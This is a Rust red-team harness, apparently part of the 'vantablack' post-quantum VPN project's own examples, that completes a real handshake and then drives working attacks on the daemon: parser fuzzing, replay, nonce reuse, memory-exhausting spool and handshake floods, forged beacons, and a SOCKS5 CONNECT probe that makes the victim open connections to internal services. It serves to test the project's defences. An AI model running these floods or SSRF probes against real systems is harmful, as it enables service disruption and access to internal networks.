//! GGN red-team attack harness (authorized pentesting tool).
//!
//! Builds real post-quantum sessions against a live `vantablack` daemon and
//! drives active attacks: parser fuzzing, packet replay, nonce-reuse probes,
//! shard-spool memory exhaustion, handshake flooding, beacon forgery, and
//! SOCKS5-CONNECT SSRF probes.
//!
//! Usage (each attack starts its own real handshake when one is needed):
//!   cargo run --example attack_harness -- handshake 127.0.0.1:15252
//!   cargo run --example attack_harness -- fuzz 127.0.0.1:15252 2000
//!   cargo run --example attack_harness -- spoolflood 127.0.0.1:15252 20000
//!   cargo run --example attack_harness -- handflood 127.0.0.1:15252 500
//!   cargo run --example attack_harness -- replay 127.0.0.1:15252 2
//!   cargo run --example attack_harness -- noncereuse 127.0.0.1:15252 3
//!   cargo run --example attack_harness -- connect 127.0.0.1:15252 127.0.0.1:6379
//!   cargo run --example attack_harness -- beacon 127.0.0.1 aabbccddeeff0011
//!
//! Environment: ATTACKER_VERBOSE=1 prints every frame; ATTACKER_SPOOF=<port>
//! sends from a chosen source port.

use std::net::{Ipv4Addr, SocketAddr, UdpSocket as StdUdp};
use std::sync::Arc;
use std::time::{Duration, Instant};

use vantablack::ghost::layers::l0_identity::{GhostIdentity, verify_peer_signature};
use vantablack::ghost::layers::l1_kem::{
    build_handshake_pdu, parse_handshake_pdu, parse_response_pdu,
    generate_kyber_keypair, kyber_encapsulate, derive_hybrid_master_key, HANDSHAKE_BLOB_LEN,
};
use vantablack::ghost::layers::l2_aead::{NonceDirection, encrypt_in_place_with_context,
                                          decrypt_in_place_with_context};
use vantablack::ghost::layers::l4_rs;
use vantablack::ghost::net::{build_gtf_frame, frame_shard, unframe, OFFSET_PAYLOAD_START,
                              OFFSET_AUTH_TAG_START, MIN_FRAME_SIZE, GTF_BULK_SIZE,
                              parse_packet_counter, parse_session_hash, MAX_PAYLOAD_LEN};
use vantablack::ghost::session::{Session, SessionRole};
use x25519_dalek::{EphemeralSecret, PublicKey as XPublicKey};

fn verbose() -> bool { std::env::var("ATTACKER_VERBOSE").is_ok() }

fn be(ctr: u32) -> [u8; 4] { ctr.to_be_bytes() }

fn send_pkt(sock: &StdUdp, dst: &SocketAddr, pkt: &[u8]) {
    if verbose() { println!("[tx] {} bytes -> {dst} (ctr={})", pkt.len(),
                          parse_packet_counter(pkt)); }
    let _ = sock.send_to(pkt, dst);
}

/// Attacker state after a completed hybrid handshake (we are the initiator).
struct PqSession {
    key: [u8; 32],
    sh: [u8; 4],
    peer_fp: String,
    sock: StdUdp,
    peer: SocketAddr,
    last_pkts: Vec<Vec<u8>>, // last frame's 3 datagrams (for replay)
}

fn gtf(sock: &StdUdp, dst: &SocketAddr, sh: [u8; 4], ctr: u32, idx: u8, shard: &[u8]) {
    let tag = [0u8; 16];
    let frame = build_gtf_frame(sh, ctr, idx, shard, &tag, false);
    send_pkt(sock, dst, &frame);
}

fn enc_split(key: &[u8; 32], ctr: u32, sh: &[u8; 4], dir: NonceDirection, pay: &[u8])
    -> (Vec<Vec<u8>>, [u8; 16]) {
    let pay_len = pay.len() as u16;
    let mut framed = pay_len.to_be_bytes().to_vec();
    framed.extend_from_slice(pay);
    if framed.len() % 2 != 0 { framed.push(0); }
    encrypt_in_place_with_context(key, ctr, sh, dir, &mut framed);
    let mut t = [0u8; 16];
    t.copy_from_slice(&framed[framed.len() - 16..]);
    let raw = l4_rs::encode(&mut framed);
    (raw.iter().map(|s| frame_shard(s)).collect(), t)
}

fn send3(sock: &StdUdp, dst: &SocketAddr, sh: [u8; 4], ctr: u32, f: &[Vec<u8>],
         out: &mut Vec<Vec<u8>>) {
    for i in 0..3 {
        let frame = build_gtf_frame(sh, ctr, i as u8, &f[i],
                                    &[0u8; 16], false);
        send_pkt(sock, dst, &frame);
        out.push(frame);
    }
}

/// Full X25519 + ML-KEM-512 hybrid handshake as the initiator.
fn handshake(peer: SocketAddr, spoof_port: Option<u16>) -> Option<PqSession> {
    let ident = GhostIdentity::generate_fresh();
    let sock = match spoof_port {
        Some(p) => StdUdp::bind(("0.0.0.0", p)).ok()?,
        None => StdUdp::bind(("0.0.0.0", 0)).ok()?,
    };
    sock.set_read_timeout(Some(Duration::from_secs(3))).ok()?;

    let (xs, xp) = {
        let xs = EphemeralSecret::random_from_rng(&mut rand::thread_rng());
        let xp = XPublicKey::from(&xs);
        (xs, xp)
    };
    let (kp, ks) = generate_kyber_keypair();
    let mut pdu = build_handshake_pdu(&ident.public_key_bytes(),
                                      |d| ident.sign(d).to_bytes(), &xp, &kp);
    let raw = l4_rs::encode(&mut pdu);
    for i in 0..3 {
        gtf(&sock, &peer, [0, 0, 0, 0], 0, i as u8, &frame_shard(&raw[i]));
    }
    println!("[*] handshake sent to {peer}");

    // wait for the 3 response shards (ctr == 1)
    let mut shards = vec![None::<Vec<u8>>; 3];
    let deadline = Instant::now() + Duration::from_secs(3);
    let mut buf = vec![0u8; GTF_BULK_SIZE];
    while Instant::now() < deadline && shards.iter().any(|s| s.is_none()) {
        match sock.recv_from(&mut buf) {
            Ok((amt, _)) if amt >= MIN_FRAME_SIZE => {
                let ctr = parse_packet_counter(&buf);
                if ctr != 1 { continue; }
                let idx = buf[8] as usize;
                if idx > 2 { continue; }
                let ats = if amt >= GTF_BULK_SIZE { 1456 } else { OFFSET_AUTH_TAG_START };
                let pe = ats.min(amt);
                if pe <= OFFSET_PAYLOAD_START { continue; }
                if let Some(sd) = unframe(&buf[OFFSET_PAYLOAD_START..pe]) {
                    shards[idx] = Some(sd);
                }
            }
            Ok(_) => {}
            Err(_) => break,
        }
    }
    let shards: Vec<_> = shards.into_iter().map(|s| s.unwrap_or_default()).collect();
    let mut w: Vec<_> = shards.into_iter().map(Some).collect();
    if l4_rs::reconstruct(&mut w).is_err() {
        println!("[!] could not reconstruct response");
        return None;
    }
    let resp = [w[0].as_ref().unwrap().as_slice(),
                w[1].as_ref().unwrap().as_slice()].concat();
    let r = parse_response_pdu(&resp)?;
    let fp = hex::encode(&r.identity_pk[..8]);

    let sm = [&r.x25519_pub[..], &r.kyber_ct[..]].concat();
    if !verify_peer_signature(&r.identity_pk, &sm, &r.signature) {
        println!("[!] response signature invalid");
        return None;
    }
    let ct = ml_kem::Ciphertext::<ml_kem::MlKem512>::from(r.kyber_ct);
    let ss = ml_kem::kem::Decapsulate::decapsulate(&ks, &ct);
    let dh = xs.diffie_hellman(&XPublicKey::from(r.x25519_pub));
    let master = derive_hybrid_master_key(dh.as_bytes(), ss.as_slice());
    let session = Session::new_with_role(master, fp.clone(), SessionRole::Initiator);
    println!("[*] session established  peer={fp}  sh={}  key8={}",
             hex::encode(session.session_hash), hex::encode(&master[..8]));
    Some(PqSession {
        key: session.master_key,
        sh: session.session_hash,
        peer_fp: fp,
        sock,
        peer,
        last_pkts: Vec::new(),
    })
}

fn cmd_data(s: &mut PqSession, ctr: u32, payload: &[u8]) {
    let (f, _t) = enc_split(&s.key, ctr, &s.sh, NonceDirection::InitiatorToResponder, payload);
    s.last_pkts.clear();
    send3(&s.sock, &s.peer, s.sh, ctr, &f, &mut s.last_pkts);
    println!("[*] sent encrypted data frame ctr={ctr} payload={} bytes", payload.len());
}

fn cmd_replay(s: &mut PqSession, ctr: u32) {
    // re-send the exact datagrams of a previously sent frame (retransmission attack)
    if s.last_pkts.is_empty() {
        // build a fresh frame and remember it, then resend twice
        let (f, _t) = enc_split(&s.key, ctr, &s.sh, NonceDirection::InitiatorToResponder, b"REPLAY");
        s.last_pkts.clear();
        send3(&s.sock, &s.peer, s.sh, ctr, &f, &mut s.last_pkts);
    }
    for pkt in &s.last_pkts {
        send_pkt(&s.sock, &s.peer, pkt);
    }
    println!("[*] replayed {} datagrams at ctr={ctr}", s.last_pkts.len());
}

fn cmd_fuzz(peer: SocketAddr, n: usize) {
    let sock = StdUdp::bind(("0.0.0.0", 0)).unwrap();
    let mut seed = 0x1234_5678u32;
    let mut rand = move || { seed = seed.wrapping_mul(1664525).wrapping_add(1013904223); seed };
    for i in 0..n {
        let kind = i % 5;
        let mut pkt = match kind {
            0 => { let l = (rand() % 1400) as usize; (0..l).map(|_| (rand() % 256) as u8).collect() }
            1 => { let l = 8 + (rand() % 40) as usize; (0..l).map(|_| (rand() % 256) as u8).collect() }
            2 => { // GTF-like header with random payload
                let mut p = vec![0u8; OFFSET_PAYLOAD_START + (rand() % 200) as usize];
                p[4..8].copy_from_slice(&be(rand()));
                p[8] = (rand() % 7) as u8;
                p }
            3 => { // length-prefix boundary abuse
                let n2 = (rand() % 70000) as u16;
                let mut p = vec![0u8; 2 + (rand() % 64) as usize];
                p[0..2].copy_from_slice(&n2.to_be_bytes());
                p }
            _ => {
                // valid frame with corrupted length prefix in the payload
                let mut f = vec![0u8; 32];
                f[0..2].copy_from_slice(&0xFFFFu16.to_be_bytes());
                f }
        };
        if i % 7 == 0 && pkt.len() >= OFFSET_PAYLOAD_START {
            pkt[OFFSET_PAYLOAD_START] = 0xFF; // corrupted unframe length
        }
        send_pkt(&sock, &peer, &pkt);
        if i % 200 == 0 { println!("[fuzz] {i}/{n}"); }
    }
    println!("[*] fuzz done: {n} packets");
}

fn cmd_spoolflood(peer: SocketAddr, n: usize) {
    // one shard per unique counter -> spool map grows one entry per packet
    let sock = StdUdp::bind(("0.0.0.0", 0)).unwrap();
    let base: u32 = 0xF000_0000;
    let mut buf = vec![0u8; OFFSET_PAYLOAD_START + 40]; // > MIN_FRAME_SIZE(32)
    for i in 0..n {
        let ctr = base.wrapping_add(i as u32);
        buf[4..8].copy_from_slice(&be(ctr));
        buf[8] = 0; // shard index 0
        // valid unframe-able shard: 2-byte length + data
        let len = 4u16;
        buf[OFFSET_PAYLOAD_START..OFFSET_PAYLOAD_START + 2]
            .copy_from_slice(&len.to_be_bytes());
        send_pkt(&sock, &peer, &buf);
        if i % 5000 == 0 { println!("[spoolflood] {i}/{n}"); }
    }
    println!("[*] spool flood done: {n} unique counters");
}

fn cmd_handflood(peer: SocketAddr, n: usize, spoof_port: Option<u16>) {
    for i in 0..n {
        let ident = GhostIdentity::generate_fresh();
        let xs = EphemeralSecret::random_from_rng(rand::thread_rng());
        let xp = XPublicKey::from(&xs);
        let (kp, _ks) = generate_kyber_keypair();
        let mut pdu = build_handshake_pdu(&ident.public_key_bytes(),
                                          |d| ident.sign(d).to_bytes(), &xp, &kp);
        let raw = l4_rs::encode(&mut pdu);
        let sock = match spoof_port {
            Some(p) => StdUdp::bind(("0.0.0.0", p)).unwrap(),
            None => StdUdp::bind(("0.0.0.0", 0)).unwrap(),
        };
        for j in 0..3 {
            let frame = build_gtf_frame([0; 4], 0, j as u8,
                                        &frame_shard(&raw[j]), &[0u8; 16], false);
            send_pkt(&sock, &peer, &frame);
        }
        if i % 100 == 0 { println!("[handflood] {i}/{n}"); }
    }
    println!("[*] handshake flood done: {n} valid handshakes");
}

fn cmd_connect(s: &mut PqSession, dest: &str) {
    // SOCKS5 CONNECT via the established session -> victim opens TCP to `dest`
    let (f, _t) = enc_split(&s.key, 2, &s.sh, NonceDirection::InitiatorToResponder,
                            dest.as_bytes());
    s.last_pkts.clear();
    send3(&s.sock, &s.peer, s.sh, 2, &f, &mut s.last_pkts);
    println!("[*] CONNECT sent for {dest} (ctr=2)");
}

fn cmd_beacon(_peer: &str) {
    // Forge a beacon with a FRESH identity (validly signed). Pre-fix, any
    // attacker could claim an arbitrary fingerprint; now only validly signed
    // beacons are honored — a fresh identity still triggers auto-handshake
    // (mesh design), but impersonating an EXISTING node's fingerprint is
    // impossible without its key.
    let sock = StdUdp::bind(("0.0.0.0", 0)).unwrap();
    let ident = GhostIdentity::generate_fresh();
    let mut pkt = vec![0u8; 112];
    pkt[..16].copy_from_slice(b"GHOST_BEACON____");
    let pk = ident.public_key_bytes();
    pkt[16..48].copy_from_slice(&pk);
    let sig = ident.sign(&pkt[16..48]).to_bytes();
    pkt[48..112].copy_from_slice(&sig);
    let mc: SocketAddr = format!("239.255.0.1:2270").parse().unwrap();
    sock.send_to(&pkt, mc).unwrap();
    println!("[*] forged signed beacon sent (fp={})", hex::encode(&pk[..8]));
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 2 { println!("usage: attack_harness <cmd> ..."); return; }
    let spoof_port = std::env::var("ATTACKER_SPOOF").ok().and_then(|v| v.parse().ok());
    let peer: SocketAddr = match args.get(2).map(|s| s.parse()) {
        Some(Ok(a)) => a,
        _ => { println!("need victim ip:port"); return; }
    };
    match args[1].as_str() {
        "handshake" => { let _ = handshake(peer, spoof_port); }
        "fuzz" => {
            let n = args.get(3).and_then(|s| s.parse().ok()).unwrap_or(1000);
            cmd_fuzz(peer, n);
        }
        "spoolflood" => {
            let n = args.get(3).and_then(|s| s.parse().ok()).unwrap_or(10000);
            cmd_spoolflood(peer, n);
        }
        "handflood" => {
            let n = args.get(3).and_then(|s| s.parse().ok()).unwrap_or(300);
            cmd_handflood(peer, n, spoof_port);
        }
        "replay" => {
            if let Some(mut s) = handshake(peer, spoof_port) {
                let ctr = args.get(3).and_then(|s| s.parse().ok()).unwrap_or(2);
                cmd_replay(&mut s, ctr);
            }
        }
        "noncereuse" => {
            // send two DIFFERENT payloads at the SAME counter (nonce-reuse probe)
            if let Some(mut s) = handshake(peer, spoof_port) {
                let ctr = args.get(3).and_then(|s| s.parse().ok()).unwrap_or(3);
                cmd_data(&mut s, ctr, b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
                cmd_data(&mut s, ctr, b"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB");
                println!("[*] two different plaintexts sent at the same ctr={ctr}");
            }
        }
        "connect" => {
            let dest = args.get(3).cloned().unwrap_or_else(|| "127.0.0.1:1".into());
            if let Some(mut s) = handshake(peer, spoof_port) {
                cmd_connect(&mut s, &dest);
            }
        }
        "beacon" => {
            let fp = args.get(3).cloned().unwrap_or_else(|| "0011223344556677".into());
            cmd_beacon(&fp);
        }
        _ => println!("unknown command {}", args[1]),
    }
    std::thread::sleep(Duration::from_millis(200));
}
